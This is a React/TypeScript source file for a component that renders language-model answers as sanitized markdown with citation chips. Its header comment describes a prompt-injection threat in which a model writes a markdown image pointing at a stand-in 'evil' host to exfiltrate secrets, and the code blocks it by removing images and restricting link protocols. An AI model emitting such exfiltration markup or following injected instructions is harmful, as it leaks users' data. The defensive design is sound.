"use client";

import { Children, isValidElement, type ReactNode } from "react";
import ReactMarkdown from "react-markdown";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";

import { CitationChip } from "@/components/ui/chips";

/**
 * Render a model-written answer.
 *
 * This is the single most dangerous string in the product: it was
 * written by a language model over text that customers uploaded, so
 * both halves are attacker-influenced. Three separate controls:
 *
 *  1. `rehype-sanitize` with a TIGHTENED schema. Raw HTML in the
 *     markdown is stripped, not escaped-and-rendered.
 *  2. IMAGES ARE REMOVED ENTIRELY. An `<img src>` is a GET to an
 *     arbitrary host the moment the answer renders -- a prompt
 *     injection that writes `![](https://evil/?d=<secrets>)` would
 *     exfiltrate on sight, with no click required. There is no
 *     legitimate image in an answer drawn from text passages, so the
 *     whole element goes rather than its host being allowlisted.
 *  3. Links are limited to http/https, open with
 *     `rel="noopener noreferrer"`, and SHOW THEIR DOMAIN, so a link
 *     reading "your invoice" cannot quietly point elsewhere.
 *
 * `dangerouslySetInnerHTML` appears nowhere in this file by design.
 */

const schema = {
  ...defaultSchema,
  tagNames: (defaultSchema.tagNames ?? []).filter(
    (tag) => tag !== "img" && tag !== "input",
  ),
  attributes: {
    ...defaultSchema.attributes,
    // Only the protocols a reader can safely be sent to. `javascript:`
    // and `data:` are absent; rehype-sanitize drops an href whose
    // protocol is not listed.
    a: [["href", "http", "https", "mailto"], "title"],
  },
  protocols: {
    ...defaultSchema.protocols,
    href: ["http", "https", "mailto"],
  },
};

const MARKER = /\[(\d+)\]/g;

/**
 * Replace `[n]` in text with a clickable chip.
 *
 * Done on the RENDERED children rather than by rewriting the markdown
 * source, so a marker inside a code fence stays literal text -- code
 * blocks are a different component and never pass through here.
 */
function withCitations(
  children: ReactNode,
  markers: Set<number>,
  onCite: (n: number) => void,
  active: number | null,
): ReactNode {
  return Children.map(children, (child) => {
    if (typeof child !== "string") {
      // Recurse into inline elements (<strong>, <em>) so a marker
      // inside emphasis is still a chip.
      if (isValidElement(child)) {
        const props = child.props as { children?: ReactNode };
        if (props.children) {
          return {
            ...child,
            props: {
              ...props,
              children: withCitations(props.children, markers, onCite, active),
            },
          };
        }
      }
      return child;
    }

    const parts: ReactNode[] = [];
    let last = 0;
    for (const match of child.matchAll(MARKER)) {
      const n = Number(match[1]);
      const at = match.index ?? 0;
      // Only markers the server actually resolved become chips. One
      // that is not in the citations payload is left as plain text
      // rather than rendered as a control that leads nowhere.
      if (!markers.has(n)) continue;
      if (at > last) parts.push(child.slice(last, at));
      parts.push(
        <CitationChip
          key={`${at}-${n}`}
          n={n}
          active={active === n}
          onClick={() => onCite(n)}
        />,
      );
      last = at + match[0].length;
    }
    if (parts.length === 0) return child;
    if (last < child.length) parts.push(child.slice(last));
    return parts;
  });
}

export function AnswerMarkdown({
  text,
  markers,
  activeMarker,
  onCite,
}: {
  text: string;
  markers: Set<number>;
  activeMarker: number | null;
  onCite: (n: number) => void;
}) {
  const cite = (children: ReactNode) =>
    withCitations(children, markers, onCite, activeMarker);

  return (
    <div className="text-[15px] leading-relaxed text-tx">
      <ReactMarkdown
        rehypePlugins={[[rehypeSanitize, schema]]}
        components={{
          p: ({ children }) => <p className="mb-3 last:mb-0">{cite(children)}</p>,
          li: ({ children }) => <li className="mb-1">{cite(children)}</li>,
          ul: ({ children }) => (
            <ul className="mb-3 list-disc space-y-1 pl-5 last:mb-0">{children}</ul>
          ),
          ol: ({ children }) => (
            <ol className="mb-3 list-decimal space-y-1 pl-5 last:mb-0">{children}</ol>
          ),
          strong: ({ children }) => (
            <strong className="font-semibold text-tx">{children}</strong>
          ),
          code: ({ children }) => (
            <code className="rounded-[5px] bg-s3 px-1.5 py-0.5 font-mono text-[13px] text-ac2">
              {children}
            </code>
          ),
          pre: ({ children }) => (
            <pre className="mb-3 overflow-x-auto rounded-ctl border border-line bg-s2 p-3 font-mono text-[12.5px]">
              {children}
            </pre>
          ),
          a: ({ href, children }) => {
            let domain = "";
            try {
              domain = href ? new URL(href).hostname : "";
            } catch {
              /* sanitize already dropped anything unparseable */
            }
            return (
              <a
                href={href}
                target="_blank"
                // noopener stops the opened page reaching back through
                // window.opener; noreferrer withholds the URL of the
                // page the user was reading.
                rel="noopener noreferrer"
                className="text-ac2 underline underline-offset-4"
              >
                {children}
                {domain && (
                  <span className="ml-1 font-mono text-[11px] text-tx3">
                    ({domain})
                  </span>
                )}
              </a>
            );
          },
        }}
      >
        {text}
      </ReactMarkdown>
    </div>
  );
}
